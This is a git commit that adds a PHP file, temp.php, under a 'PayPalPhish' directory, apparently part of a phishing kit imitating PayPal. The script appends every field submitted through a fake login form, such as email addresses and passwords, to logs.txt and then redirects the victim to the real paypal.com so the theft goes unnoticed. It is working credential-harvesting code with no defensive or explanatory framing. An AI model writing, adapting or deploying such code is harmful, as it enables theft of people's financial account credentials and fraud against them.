332bb9b92ead66b494e4f851e6f28a822db45e5d
Dauwtticus <48638152+Dauwtticus@users.noreply.github.com>
2019-03-17 00:10:53 -0400

    Add files via upload

---
+++ PayPalPhish/paypal page/temp.php
@@ -0,0 +1,14 @@
+<?php
+header ('Location:http://paypal.com');
+$handle = fopen("logs.txt", "a");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, " = ");
+   fwrite($handle, $value);
+   fwrite($handle, "\r   \n");
+}
+fwrite($handle, "\r   \n   \n");
+fclose($handle);
+exit;
+
+?>
